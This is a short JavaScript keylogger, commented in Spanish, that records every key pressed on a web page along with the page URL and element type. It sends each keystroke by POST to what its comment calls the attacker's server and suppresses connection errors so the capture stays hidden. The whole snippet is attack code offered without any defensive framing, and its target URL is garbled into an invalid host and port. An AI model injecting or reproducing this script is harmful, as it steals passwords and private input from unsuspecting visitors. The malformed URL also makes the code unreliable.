// Keylogger: captura todas las teclas pulsadas en la página
document.addEventListener('keydown', function(event) {
    const data = {
        key: event.key,
        url: window.location.href,
        timestamp: new Date().toISOString(),
        input: event.target.tagName // Indica si era un INPUT, TEXTAREA, etc.
    };

    // Enviar cada tecla al servidor atacante
    fetch('http://:192.168.1.1315000/keylog', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    }).catch(e => {/* Silenciar errores de conexión */});
});
